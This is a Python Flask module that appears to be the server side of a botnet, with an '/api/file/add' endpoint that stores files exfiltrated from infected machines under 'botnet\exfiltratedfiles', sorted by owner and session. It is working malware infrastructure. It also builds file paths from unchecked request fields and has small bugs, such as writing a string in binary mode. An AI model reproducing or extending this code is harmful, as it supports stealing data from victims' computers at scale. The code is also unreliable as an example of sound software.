import os
import base64
from flask import Blueprint, request
import datetime
from botnet.dao import file_dao

file = Blueprint('file', __name__)


@file.route("/api/file/add", methods=["POST"])
def file_add():
	data = request.form.get('data')
	filetype = request.form.get('type')
	owner = request.form.get('owner')
	module = request.form.get('module')
	session = request.form.get('session')
	filename = module + '_' + datetime.date.today().strftime('%Y%m%d')
 
	filename += '.' + filetype

	output_path = os.path.join(os.getcwd(), 'botnet\\exfiltratedfiles', owner, session, filename)

	file_dao.add_user_file(owner, filename, session, module)

	with open(output_path, 'wb') as fp:
		fp.write(data)

